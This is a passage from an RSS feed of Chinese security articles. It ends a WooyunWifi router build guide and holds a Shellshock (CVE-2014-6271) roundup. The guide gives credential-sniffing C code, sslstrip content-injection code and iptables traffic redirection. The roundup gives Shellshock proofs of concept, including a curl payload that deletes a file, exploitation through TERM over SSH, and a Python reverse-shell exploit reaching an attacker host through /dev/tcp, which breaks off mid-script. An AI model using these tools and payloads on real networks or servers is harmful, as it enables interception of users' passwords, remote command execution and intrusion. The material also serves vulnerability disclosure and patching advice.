&lt;/code&gt;&lt;p&gt;结束掉php-cgi的进程，因为uhttpd是一个单线程服务器，因此php-cgi挂在那里就会导致服务器无响应，kill掉之后服务器才能响应其他请求。&lt;/p&gt;&lt;p&gt;所以流程是这样的： 1、 用户打开页面 2、 PHP执行shell命令，判断sslstrip是否正在运行，如果不是，返回“启动”按钮 3、 用户点击启动按钮 4、 到sson.php中异步请求sslstripon.php，然后…… 5、 sslstripon.php调用test2.sh，后台运行sslstrip，然后test2.sh kill掉php-cgi，于是sslstripon.php执行完毕（返回500 bad gateway），但是用户在sson.php中等待1s后返回主界面了，所以看不到500错误&lt;/p&gt;&lt;p&gt;绕了个圈解决了单线程服务器的阻塞问题，不过这样看来软件架构怪怪的，先实现功能再说，以后再改进吧&lt;/p&gt;&lt;p&gt;大家可能会有这样的疑问： 你在PHP中运行shell命令时难道不是www-data权限吗？ 如何运行tcpdump之类的高权限程序呢？&lt;/p&gt;&lt;p&gt;其实我之前也特地设计了用sudoer解决权限问题的方案，只不过后来我发现（个人猜测），Openwrt这类的嵌入式系统权限和用户组并不严格，直接就是root运行一切程序了&lt;/p&gt;&lt;h2&gt;0x02 Bootstrap前端设计：&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://www.layoutit.com/build?r=35144450&quot; data-editable=&quot;true&quot; data-title=&quot;在线&quot;&gt;在线&lt;/a&gt;画了个框架，然后放在路由器上一边vi一边刷新浏览器&lt;/p&gt;&lt;h2&gt;0x03 MITM功能设计：&lt;/h2&gt;&lt;p&gt;因为这个功能主要是在应用层实现的，而且和WEB相关协议联系比较密切，所以放在WEB层来探讨这个问题。 首先我们来分析一下解决这个功能的可选方案：&lt;/p&gt;&lt;p&gt;1、 在传输层使用transparent proxy做MITM数据包截取/修改 2、 在应用层使用HTTP双向通信模型做MITM内容截取/修改&lt;/p&gt;&lt;p&gt;刚开始的思路是做一个transparent proxy，但是发现由于数据包分段以及gzip格式传输，导致传输层做HTTP内容注入比较复杂，而且其他协议的数据包又不具备通用性的MITM介入方式，因此综合看来还是做应用层HTTP协议的双向通信模型比较简便。&lt;/p&gt;&lt;p&gt;而我们知道，SSlstrip就是基于这种应用层双向通信模型构建的，我们可以借用SSlstrip的代码进行改造&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;ServerConnection.py

    def replaceSecureLinks(self, data):
        iterator = re.finditer(ServerConnection.urlExpression, data)

        for match in iterator:
            url = match.group()

            logging.debug(&quot;Found secure reference: &quot; + url)

            url = url.replace(&#39;https://&#39;, &#39;http://&#39;, 1)
            url = url.replace(&#39;&amp;amp;amp;&#39;, &#39;&amp;amp;&#39;)
            self.urlMonitor.addSecureLink(self.client.getClientIP(), url)

        data = re.sub(ServerConnection.urlExplicitPort, r&#39;http://\1/&#39;, data)

        #在这里对data进行处理，即可完成MITM介入
        #这个函数本来的功能是替换https为http普通链接
        #在此之前已经完成了对gzip的解压，以及建立了双向连接

        replaceconfig=os.popen(&#39;cat /etc/wooyunwifi/replace.conf&#39;).readlines()
        data = data.replace(replaceconfig[0].strip(),replaceconfig[1].strip())

        #其实就两句话，看上去很简单，哈

        return re.sub(ServerConnection.urlType, &#39;http://&#39;, data)
&lt;/code&gt;&lt;p&gt;再做个WEB页面 至此，MITM设计完毕&lt;/p&gt;&lt;p&gt;感想：写一句代码只需要一分钟，但知道这行代码写在哪需要一天&lt;/p&gt;&lt;p&gt;既然WEB控制端设计好了，开始做model层的数据处理工具吧！&lt;/p&gt;&lt;h1&gt;第四章：路由器的数据处理&lt;/h1&gt;&lt;h2&gt;0x00 前言:&lt;/h2&gt;&lt;blockquote&gt;&lt;p&gt;本章概括了WooyunWifi的model层数据处理功能实现。&lt;/p&gt;&lt;/blockquote&gt;&lt;h2&gt;0x01 交叉编译：&lt;/h2&gt;&lt;p&gt;我们在本地编译一个Linux程序：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;gcc -o mailsniff mailsniff.c
./mailsniff.c 
&lt;/code&gt;&lt;p&gt;在本地可以正常运行&lt;/p&gt;&lt;p&gt;而我们要编译一个在路由器上可以运行的程序，又不能给路由器安装gcc，那怎么办呢？&lt;/p&gt;&lt;p&gt;我们采取交叉编译在本地编译路由器中的程序：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;./barrier_breaker/staging_dir/toolchain-mips_34kc_gcc-4.8-linaro_uClibc-0.9.33.2/bin/mips-openwrt-linux-gcc -o mailsniff mailsniff.c
&lt;/code&gt;&lt;p&gt;这里的交叉编译工具链跟你的路由器芯片型号有关，需要你先选择toolchains编译make V=s后才会出现，当然你也可以从downloads.openwrt.org直接下载对应芯片型号的toolchains&lt;/p&gt;&lt;p&gt;如何制作软件包集成进固件在第二章介绍，此处不再赘述&lt;/p&gt;&lt;h2&gt;0x02 数据交互：&lt;/h2&gt;&lt;p&gt;实例说明：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;echo &quot;1&quot; &amp;gt; ${1}/sslstrip.log
&lt;/code&gt;&lt;p&gt;将echo的结果写入文件（basepath从外部PHP调用传入）&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;ngrep -l -q -W byline -d $1 port 110 or 143 or 25|mailsniff
&lt;/code&gt;&lt;p&gt;将ngrep的stdout接到mailsniff的stdin上（device从外部PHP调用传入）&lt;/p&gt;&lt;p&gt;注意：这里的ngrep -l 选项是为了使ngrep的stdout以行为单位缓冲，避免由于数据缓冲导致的数据不及时同步问题&lt;/p&gt;&lt;p&gt;而sslstrip本身是输出一个log文件&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;sslstrip -w ${1}/sslstrip.log -l 10000 &amp;amp; 
tail -f ${1}/sslstrip.log|stripsslstrip &amp;amp;
&lt;/code&gt;&lt;p&gt;使用tail就可以实现实时输出&lt;/p&gt;&lt;h2&gt;0x03 自动机设计：&lt;/h2&gt;&lt;p&gt;以passsniff为例介绍C语言自动机设计：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;/*
    code by lxj616@wooyun
*/
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;errno.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/socket.h&amp;gt;
#include &amp;lt;netinet/in.h&amp;gt;
#include &amp;lt;arpa/inet.h&amp;gt;
#include &amp;lt;netdb.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

//Openwrt默认权限可以读写etc下文件
void get_basepath(char *basepath)
{
    FILE *fp1;
    fp1 = fopen(&quot;/etc/wooyunwifi/basepath.conf&quot;,&quot;r&quot;);
    fscanf(fp1,&quot;%s&quot;,basepath);  
    fclose(fp1);
}

//解析URL中用户名和密码
void strip_pass(char *basepath,char *buffer,char *host)
{
    int i;
    int flag=0;
    char *user;
    char *pass;
    user=strstr(buffer,&quot;user&quot;);
    pass=strstr(buffer,&quot;pass&quot;);

    if(user&amp;amp;&amp;amp;pass)
    {
        user=strstr(user,&quot;=&quot;)+1;
        pass=strstr(pass,&quot;=&quot;)+1;

        for(i=0;user[i]!=&#39;\0&#39;&amp;amp;&amp;amp;flag==0;i++)
        {
            if(user[i]==&#39;&amp;amp;&#39;)
            {
                user[i]=&#39;\0&#39;;
                flag=1;
            }
        }
        flag=0;
        for(i=0;pass[i]!=&#39;\0&#39;&amp;amp;&amp;amp;flag==0;i++)
        {
            if(pass[i]==&#39;&amp;amp;&#39;)
            {
                pass[i]=&#39;\0&#39;;
                flag=1;
            }
        }
    }
    else 
    {
        strcpy(user,&quot;unknown&quot;);     strcpy(pass,&quot;unknown&quot;);     }   update_log(basepath,host,user,pass); } 
//写文本文件保存信息
void writeLog(char *path,char *user,char *pass)
{
    FILE *fp = fopen(path,&quot;a&quot;);
    fputs(&quot;\r\n&quot;,fp);
    fputs(user,fp);
    fputs(&quot;\r\n&quot;,fp)
    fputs(pass,fp);
    fputs(&quot;\r\n&quot;,fp);
    fflush(stdout);
    fclose(fp);
}

//写文件，以host命名，因为是直接读的Host: ***.com，因此去掉前面的前缀
void update_log(char *basepath,char *host,char *user,char *pass)
{
    char tmppath[1629];
    strcpy(tmppath,basepath);
    strcat(tmppath,&quot;/passdump/&quot;);
    writeLog(strcat(tmppath,host+6),user,pass);
}


int main()
{
    char basepath2[128];
    char basepath[128];
    char buffer[1629]=&quot;0&quot;;
    char pass[1629]=&quot;0&quot;;
    char pass2[1629]=&quot;0&quot;;
    char host[1629]=&quot;0&quot;;
    char host2[1629]=&quot;0&quot;;
    int flag=0;

    char mkdir[128]=&quot;mkdir &quot;; 

    get_basepath(basepath);

    strcat(mkdir,basepath);
    strcat(mkdir,&quot;/passdump&quot;);

    //先保证存在保存的文件夹
    system(mkdir);

    while(1)
    {
        fgets(buffer,1628,stdin);
        //如果是空行，代表一个数据包结束 或者 紧接着POST内容
        if(strcmp(buffer,&quot;\n&quot;)==0)
        {
            //已经出现了记录？写文件然后清空当前密码记录
            if((strcmp(host,&quot;0&quot;)!=0)&amp;amp;&amp;amp;(strcmp(pass,&quot;0&quot;)!=0))
            {
                //干掉referer，免得一个密码记录好多次
                if(!strstr(pass,&quot;Referer:&quot;))
                {
                    strip_pass(basepath,pass,host);
                    printf(&quot;\n\n&quot;);
                }
                strcpy(pass,&quot;0&quot;);
            }
        }
        else if(strstr(buffer,&quot;Host:&quot;))
        {
            //去掉0x0a和0x0d
            buffer[strlen(buffer)-2]=&#39;\0&#39;;
            strcpy(host,buffer);
        }
        else if(strstr(buffer,&quot;user&quot;)&amp;amp;&amp;amp;strstr(buffer,&quot;pass&quot;))
        {
            //去掉0x0a和0x0d
            buffer[strlen(buffer)-2]=&#39;\0&#39;;
            strcpy(pass,buffer);
        }
        //buffer[strlen(buffer)-2]=&#39;\0&#39;;
    }
    return 0;
}
&lt;/code&gt;&lt;p&gt;概括起来我们的自动机做了以下事情：&lt;/p&gt;&lt;p&gt;1、 Ngrep嗅探PHP指定的device数据包，筛选80端口HTTP请求，然后把stdout转接到我们的自动机stdin上 2、 C语言自动机不断按行读取stdin中的输入，不停检测密码信息以及Host信息，但数据包结束后，判断是否截获密码信息，如果是，追加写入文本记录文件 3、 自动机本身不会停止工作，必须依靠PHP+Shellscript来外部kill掉&lt;/p&gt;&lt;h2&gt;0x04 为什么不用python：&lt;/h2&gt;&lt;p&gt;字符处理，还是python方便，但是我们真的很需要“效率”，无论是从内存占用还是数据包延迟来说，C语言仍然占据了不可替代的优势（其实也没那么悬殊，只不过自动机程序比较简单，因此对C熟练的话不会很吃力） 还有一个重要的原因是：当初我以为会涉及到kernel的数据包修改，后来写完自动机才发现原来想多了，所以C语言反倒只用来写了几个自动机，唉……&lt;/p&gt;&lt;h2&gt;0x05 使用iptables重定向流量&lt;/h2&gt;&lt;p&gt;例：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;iptables -t nat -A PREROUTING -s 192.168.16.249 -p tcp --dport 80 -j DNAT --to-destination 192.168.16.134:8029
iptables -t nat -A POSTROUTING -p tcp -d 192.168.16.134 --dport 80 -j MASQUERADE
iptables -t nat -A POSTROUTING -p tcp -d 192.168.16.134 --dport 8029 -j MASQUERADE
&lt;/code&gt;&lt;p&gt;由此一方面可以将流量重定向到自己的proxy上（是transparrent proxy），也可以直接转发到其他ip（如burpsuite）&lt;/p&gt;&lt;p&gt;至此，WooyunWifi设计完成，大家可能会觉得“哇，还是很简单的嘛”，如果大家真的打算试一下全过程，请务必要看《WooyunWifi 第五章：十万个变砖方法》&lt;/p&gt;</description>
<author>瞌睡龙</author>
<guid isPermaLink="false">2014-10-20-19873529</guid>
<pubDate>Mon, 20 Oct 2014 00:00:00 +0800</pubDate>
</item>
<item>
<title>CVE-2014-6271资料汇总</title>
<link>https://henix.github.io/feeds/zhuanlan.drops/2014-09-26-19857156.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/19857156&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;author: shawn&lt;/p&gt;&lt;p&gt;&lt;b&gt;0x00 什么是BASH&lt;/b&gt;&lt;/p&gt;&lt;p&gt;Bourne Again Shell(简称BASH）是在GNU/Linux上最流行的SHELL实现，于1980年诞生，经过了几十年的进化从一个简单的终端命令行解释器演变成了和GNU系统深 度整合的多功能接口。&lt;/p&gt;&lt;p&gt;&lt;b&gt;0x01 CVE-2014-6271&lt;/b&gt;&lt;/p&gt;&lt;p&gt;法国GNU/Linux爱好者Stéphane Chazelas于2014年9月中旬发现了著名的SHELL实)的一个漏洞，你可以通过构造环境变量的值来执行你想要执行的脚本代码，据报道称，这个漏洞能影响众多的运行在GNU/Linux上的会跟BASH交互的应用程序，包括:&lt;/p&gt;&lt;p&gt;在sshd配置中使用了ForceCommand用以限制远程用户执行命令，这个漏洞可以绕过限制去执行任何命令。一些Git和Subversion部署环境的限制Shell也会出现类似情况，OpenSSH通常用法没有问题。&lt;/p&gt;&lt;p&gt;Apache服务器使用mod_cgi或者mod_cgid，如果CGI脚本在BASH或者运行在子SHELL里都会受影响。子Shell中使用C的system/popen，Python中使用os.system/os.popen，PHP中使用system/exec(CGI模式)和Perl中使用open/system的情况都会受此漏洞影响。&lt;/p&gt;&lt;p&gt;PHP脚本执行在mod_php不会受影响。 DHCP客户端调用shell脚本接收远程恶意服务器的环境变量参数值的情况会被此漏洞利用。&lt;/p&gt;&lt;p&gt;守护进程和SUID程序在环境变量设置的环境下执行SHELL脚本也可能受到影响。&lt;/p&gt;&lt;p&gt;任何其他程序执行SHELL脚本时用BASH作为解释器都可能受影响。Shell脚本不导出的情况下不会受影响。&lt;/p&gt;&lt;p&gt;OpenSSH, Apache2, php, dhcp client甚至带SUID的程序。&lt;/p&gt;&lt;p&gt;1，本地SHELL环境中测试是否有漏洞：&lt;/p&gt;&lt;code lang=&quot;bash&quot;&gt;$ env x=&#39;() { :;}; echo vulnerable&#39; bash -c &quot;echo this is a test&quot;
&lt;/code&gt;&lt;p&gt;如果存在漏洞会打印&quot;vulnerable&quot;。&lt;/p&gt;&lt;p&gt;2，C程序：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;-----------------------------------------------------------------------------


/* CVE-2014-6271 + aliases with slashes PoC - je [at] clevcode [dot] org */

#include &amp;lt;unistd.h&amp;gt;

#include &amp;lt;stdio.h&amp;gt;

int main()

{

    char *envp[] = {

        &quot;PATH=/bin:/usr/bin&quot;,

        &quot;/usr/bin/id=() { &quot;

        &quot;echo pwn me twice, shame on me; }; &quot;

        &quot;echo pwn me once, shame on you&quot;,

        NULL

    };


    char *argv[] = { &quot;/bin/bash&quot;, NULL };

    execve(argv[0], argv, envp);

    perror(&quot;execve&quot;);

    return 1;

}&lt;/code&gt;&lt;br&gt;&lt;p&gt;测试：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;je@tiny:~$ gcc -o bash-is-fun bash-is-fun.c

je@tiny:~$ ./bash-is-fun

pwn me once, shame on you

je@tiny:/home/je$ /usr/bin/id

pwn me twice, shame on me&lt;/code&gt;&lt;br&gt;&lt;p&gt;这个POC中可以看出BASH根本就没有去处理结尾，后面我们可以通过补丁来看为什么。&lt;/p&gt;&lt;p&gt;3，INVISIBLETHREAT上对于HTTP环境的测试：&lt;/p&gt;&lt;p&gt;创建一个脚本叫poc.cgi:&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;#!/bin/bash

echo &quot;Content-type: text/html&quot;

echo &quot;&quot;

echo &#39;&amp;lt;html&amp;gt;&#39;

echo &#39;&amp;lt;head&amp;gt;&#39;

echo &#39;&amp;lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&amp;gt;&#39;

echo &#39;&amp;lt;title&amp;gt;PoC&amp;lt;/title&amp;gt;&#39;

echo &#39;&amp;lt;/head&amp;gt;&#39;

echo &#39;&amp;lt;body&amp;gt;&#39;

echo &#39;&amp;lt;pre&amp;gt;&#39;

/usr/bin/env

echo &#39;&amp;lt;/pre&amp;gt;&#39;

echo &#39;&amp;lt;/body&amp;gt;&#39;

echo &#39;&amp;lt;/html&amp;gt;&#39;

exit 0&lt;/code&gt;&lt;p&gt;把脚本放入测试机后，输入：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;$ curl http://192.168.0.1/poc.cgi

&amp;lt;html&amp;gt;

&amp;lt;head&amp;gt;

&amp;lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&amp;gt;

&amp;lt;title&amp;gt;PoC&amp;lt;/title&amp;gt;

&amp;lt;/head&amp;gt;

&amp;lt;body&amp;gt;

&amp;lt;pre&amp;gt;

SERVER_SIGNATURE=&amp;lt;address&amp;gt;Apache/2.2.22 (Debian) Server at 192.168.0.1 Port 80&amp;lt;/address&amp;gt;

HTTP_USER_AGENT=curl/7.26.0

SERVER_PORT=80

HTTP_HOST=192.168.0.1

DOCUMENT_ROOT=/var/www

SCRIPT_FILENAME=/var/www/poc.cgi

REQUEST_URI=/poc.cgi

SCRIPT_NAME=/poc.cgi

REMOTE_PORT=40974

PATH=/usr/local/bin:/usr/bin:/bin

PWD=/var/www

SERVER_ADMIN=webmaster@localhost

HTTP_ACCEPT=*/*

REMOTE_ADDR=192.168.0.1

SHLVL=1

SERVER_NAME=192.168.0.1

SERVER_SOFTWARE=Apache/2.2.22 (Debian)

QUERY_STRING=

SERVER_ADDR=192.168.0.1

GATEWAY_INTERFACE=CGI/1.1

SERVER_PROTOCOL=HTTP/1.1

REQUEST_METHOD=GET

_=/usr/bin/env

&amp;lt;/pre&amp;gt;

&amp;lt;/body&amp;gt;

&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;br&gt;&lt;p&gt;再来试试使用curl设置一个user-agent玩玩：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;$ curl -A &quot;() { :; }; /bin/rm /var/www/target&quot; http://192.168.0.1/poc.cgi


&amp;lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&amp;gt;

&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;

&amp;lt;title&amp;gt;500 Internal Server Error&amp;lt;/title&amp;gt;

&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;

&amp;lt;h1&amp;gt;Internal Server Error&amp;lt;/h1&amp;gt;

&amp;lt;p&amp;gt;The server encountered an internal error or

misconfiguration and was unable to complete

your request.&amp;lt;/p&amp;gt;

&amp;lt;p&amp;gt;Please contact the server administrator,

webmaster@localhost and inform them of the time the error occurred,

and anything you might have done that may have

caused the error.&amp;lt;/p&amp;gt;

&amp;lt;p&amp;gt;More information about this error may be available

in the server error log.&amp;lt;/p&amp;gt;

&amp;lt;hr&amp;gt;

&amp;lt;address&amp;gt;Apache/2.2.22 (Debian) Server at 192.168.0.1 Port 80&amp;lt;/address&amp;gt;

&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;br&gt;&lt;p&gt;上面已经把/var/www/target给删除了，再来看看：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;$ curl http://192.168.0.1/target


&amp;lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&amp;gt;

&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;

&amp;lt;title&amp;gt;404 Not Found&amp;lt;/title&amp;gt;

&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;

&amp;lt;h1&amp;gt;Not Found&amp;lt;/h1&amp;gt;

&amp;lt;p&amp;gt;The requested URL /target was not found on this server.&amp;lt;/p&amp;gt;

&amp;lt;hr&amp;gt;

&amp;lt;address&amp;gt;Apache/2.2.22 (Debian) Server at 192.168.0.1 Port 80&amp;lt;/address&amp;gt;

&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;br&gt;&lt;p&gt;这个例子当中，内容被传入 HTTP_USER_AGENT (CGI 会把HTTP头当成环境变量解析). 最终变成这样：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;HTTP_USER_AGENT() {

    :;

};

/bin/rm /var/www/target
&lt;/code&gt;&lt;p&gt;应该只解析函数的定义，但是后面的内容仍然执行了。&lt;/p&gt;&lt;p&gt;4, 针对OpenSSH的POC&lt;/p&gt;&lt;p&gt;目前有2个攻击平面，Solar Designer给出了SSH_ORIGINAL_COMMAND的本地利用方法：&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://seclists.org/oss-sec/2014/q3/651&quot; data-editable=&quot;true&quot; data-title=&quot;seclists.org/oss-sec/2014/q3/651&quot; class=&quot;&quot;&gt;seclists.org/oss-sec/2014/q3/651&lt;/a&gt;&lt;/p&gt;&lt;p&gt;还有就是针对远程利用的POC，通过利用TERM：&lt;/p&gt;&lt;p&gt;在机器A上生成一对RSA key pair:&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;shawn@debian-test32:~/.ssh$ ssh-keygen 

Generating public/private rsa key pair.

Enter file in which to save the key (/home/shawn/.ssh/id_rsa): 

Enter passphrase (empty for no passphrase): 

Enter same passphrase again: 

Your identification has been saved in /home/shawn/.ssh/id_rsa.

Your public key has been saved in /home/shawn/.ssh/id_rsa.pub.

The key fingerprint is:

09:1c:92:fb:c5:68:f8:e1:b9:c2:62:a8:c7:75:5b:dc shawn@debian-test32

The key&#39;s randomart image is:

+--[ RSA 2048]----+

|    ...          |

|    .o .         |

|     ooo         |

|    o +.o.       |

|     = =S.       |

|    . * o E      |

| o o . +         |

|. = o o          |

|oo . .           |

+-----------------+&lt;/code&gt;&lt;br&gt;&lt;p&gt;把A的公钥拷贝到机器B上：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;$cat /home/shawn/.ssh/authorized_keys

command=&quot;/tmp/ssh.sh&quot; ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9xYHEdjbbvSO+RAtDS3u+R4sD87SUQq5OZJ+6P5n3BoOz8eKfmK2B4qQa28uGvpseFSSXIoXTKdeS3mCXevbibGG6E3RQ63U7USrh9iQupO6c45Qt+3/WOo7X3mRlZ1awUmCjurcA5Zm/yOvyMJCoRd1kpkiJljgHtMztEhWvAE4inFkqyWC81SSfsvNd/GEiyCpFw84UTdF/cH626V3V73hlxwBMd8UKI27I7ATMOcPgWsI5738tLpgPDSisvZZXZNlxAfvSgpxKYAHOQ9VsaJCG4q+Giob5iX4IDzn8gs8G7uGW+EGhzTMq83f/8ar5a5Ex8Dg9M/loYPIPp5gJ shawn@debian-test32&lt;/code&gt;&lt;p&gt;一个用于控制command/SSH_ORIGINAL_COMMAND的脚本&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;shawn@linux-ionf:~/.ssh&amp;gt; cat /tmp/ssh.sh

#!/bin/sh

case &quot;$SSH_ORIGINAL_COMMAND&quot; in

    &quot;ps&quot;)

        ps -ef

        ;;

    &quot;vmstat&quot;)

        vmstat 1 100

        ;;

    &quot;cups stop&quot;)

        /etc/init.d/cupsys stop

        ;;

    &quot;cups start&quot;)

        /etc/init.d/cupsys start

        ;;

    *)

        echo &quot;Sorry. Only these commands are available to you:&quot;

        echo &quot;ps, vmstat, cupsys stop, cupsys start&quot;

        #exit 1

        ;;

esac&lt;/code&gt;&lt;p&gt;机器A上可以正常的使用限制脚本:&lt;/p&gt;&lt;br&gt;&lt;code lang=&quot;text&quot;&gt;shawn@debian-test32:~/.ssh$ export SSH_ORIGINAL_COMMAND=&quot;ps&quot;

shawn@debian-test32:~/.ssh$ ssh  shawn@192.168.115.129 $SSH_ORIGINAL_COMMAND

Enter passphrase for key &#39;/home/shawn/.ssh/id_rsa&#39;: 

UID        PID  PPID  C STIME TTY          TIME CMD

root         1     0  0 16:47 ?        00:00:02 /sbin/init showopts

root         2     0  0 16:47 ?        00:00:00 [kthreadd]

root         3     2  0 16:47 ?        00:00:00 [ksoftirqd/0]&lt;/code&gt;&lt;br&gt;&lt;p&gt;借助TERM来利用：&lt;/p&gt;&lt;br&gt;&lt;code lang=&quot;text&quot;&gt;shawn@debian-test32:~$ export TERM=&#39;() { :;}; id&#39;; ssh  shawn@192.168.115.129

Enter passphrase for key &#39;/home/shawn/.ssh/id_rsa&#39;: 

uid=1000(shawn) gid=100(users) groups=100(users)

Connection to 192.168.115.129 closed.&lt;/code&gt;&lt;br&gt;&lt;p&gt;&lt;b&gt;0x02 补丁和后续&lt;/b&gt;&lt;/p&gt;&lt;p&gt;从最早GNU/Linux发行版社区收到的补丁：&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://bugzilla.novell.com/attachment.cgi?id=606672&quot; data-editable=&quot;true&quot; data-title=&quot;novell.com 的页面&quot; class=&quot;&quot;&gt;https://bugzilla.novell.com/attachment.cgi?id=606672&lt;/a&gt;&lt;/p&gt;&lt;p&gt;可以看出BASH的确没有做异常处理，而直接解析后就执行了。&lt;/p&gt;&lt;p&gt;正式的社区补丁在这里：&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://ftp.gnu.org/pub/gnu/bash/bash-3.0-patches/bash30-017&quot; data-editable=&quot;true&quot; data-title=&quot;gnu.org 的页面&quot;&gt;http://ftp.gnu.org/pub/gnu/bash/bash-3.0-patches/bash30-017&lt;/a&gt;&lt;a href=&quot;http://ftp.gnu.org/pub/gnu/bash/bash-3.1-patches/bash31-018&quot; data-editable=&quot;true&quot; data-title=&quot;gnu.org 的页面&quot;&gt;http://ftp.gnu.org/pub/gnu/bash/bash-3.1-patches/bash31-018&lt;/a&gt;&lt;a href=&quot;http://ftp.gnu.org/pub/gnu/bash/bash-3.2-patches/bash32-052&quot; data-editable=&quot;true&quot; data-title=&quot;gnu.org 的页面&quot;&gt;http://ftp.gnu.org/pub/gnu/bash/bash-3.2-patches/bash32-052&lt;/a&gt;&lt;a href=&quot;http://ftp.gnu.org/pub/gnu/bash/bash-4.0-patches/bash40-039&quot; data-editable=&quot;true&quot; data-title=&quot;gnu.org 的页面&quot;&gt;http://ftp.gnu.org/pub/gnu/bash/bash-4.0-patches/bash40-039&lt;/a&gt;&lt;a href=&quot;http://ftp.gnu.org/pub/gnu/bash/bash-4.1-patches/bash41-012&quot; data-editable=&quot;true&quot; data-title=&quot;gnu.org 的页面&quot;&gt;http://ftp.gnu.org/pub/gnu/bash/bash-4.1-patches/bash41-012&lt;/a&gt;&lt;a href=&quot;http://ftp.gnu.org/pub/gnu/bash/bash-4.2-patches/bash42-048&quot; data-editable=&quot;true&quot; data-title=&quot;gnu.org 的页面&quot; class=&quot;&quot;&gt;http://ftp.gnu.org/pub/gnu/bash/bash-4.2-patches/bash42-048&lt;/a&gt;&lt;a href=&quot;http://ftp.gnu.org/pub/gnu/bash/bash-4.3-patches/bash43-025&quot; data-editable=&quot;true&quot; data-title=&quot;gnu.org 的页面&quot;&gt;http://ftp.gnu.org/pub/gnu/bash/bash-4.3-patches/bash43-025&lt;/a&gt;&lt;/p&gt;&lt;p&gt;但由于补丁修复的不完整，导致了CVE-2014-7169的爆出,POC如下：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;shawn@shawn-fortress /tmp $ date -u &amp;gt; test_file

shawn@shawn-fortress /tmp $ env X=&#39;() { (a)=&amp;lt;\&#39; bash -c &#39;test_file cat&#39;

bash: X: line 1: syntax error near unexpected token `=&#39;

bash: X: line 1: `&#39;

bash: error importing function definition for `X&#39;

Thu Sep 25 09:37:04 UTC 2014&lt;/code&gt;&lt;br&gt;&lt;p&gt;这个POC可以让攻击者能读文件，看来后续的故事还没结束...................(Sep 25 13:30 UTC 2014)&lt;/p&gt;&lt;p&gt;UTC时间2014年9月25日上午，CVE-2014-7169被BASH社区修复，目前主要的GNU/Linux发行版包括Debian, Gentoo, OpenSUSE, CentOS, RHEL都已经提供了相&lt;br&gt;
关的升级。&lt;/p&gt;&lt;p&gt;2014年9月26日，BASH又爆出了CVE-2014-7186和CVE-2014-7187：&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://www.openwall.com/lists/oss-security/2014/09/26/2&quot; data-editable=&quot;true&quot; data-title=&quot;oss-security&quot;&gt;oss-security&lt;/a&gt;&lt;/p&gt;&lt;p&gt;防御方案&lt;/p&gt;&lt;p&gt;在各种GNU/Linux发行版里需要升级：&lt;/p&gt;&lt;p&gt;Debian-based（包括Ubuntu）:&lt;/p&gt;&lt;p&gt;sudo apt-get update &amp;amp;&amp;amp; apt-get upgrade&lt;/p&gt;&lt;p&gt;Gentoo：&lt;/p&gt;&lt;p&gt;sudo emerge --sync &amp;amp;&amp;amp; glsa-check -f affected&lt;/p&gt;&lt;p&gt;OpenSSH:&lt;/p&gt;&lt;p&gt;加入no-pty&lt;/p&gt;&lt;p&gt;后续故事&lt;/p&gt;&lt;p&gt;这个漏洞引起的故事并没有因为补丁而结束，因为这个星球上有太多人不会那么care这个漏洞，也就是说他们不会即时的去打补丁，而从攻击者的一方而言，从漏洞公开已经出现了很多类似：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;------------------------------------------------------------------------

    #

    #CVE-2014-6271 cgi-bin reverse shell

    #

    import httplib,urllib,sys

    if (len(sys.argv)&amp;lt;4):

            print &quot;Usage: %s &amp;lt;host&amp;gt; &amp;lt;vulnerable CGI&amp;gt; &amp;lt;attackhost/IP&amp;gt;&quot; % sys.argv[0]

            print &quot;Example: %s localhost /cgi-bin/test.cgi 10.0.0.1/8080&quot; % sys.argv[0]

            exit(0)

    conn = httplib.HTTPConnection(sys.argv[1])

    reverse_shell=&quot;() { ignored;};/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/%s 0&amp;gt;&amp;amp;1&quot; % sys.argv[3]

    headers = {&quot;Content-type&quot;: &quot;application/x-www-form-urlencoded&quot;,

            &quot;test&quot;:reverse_shell }

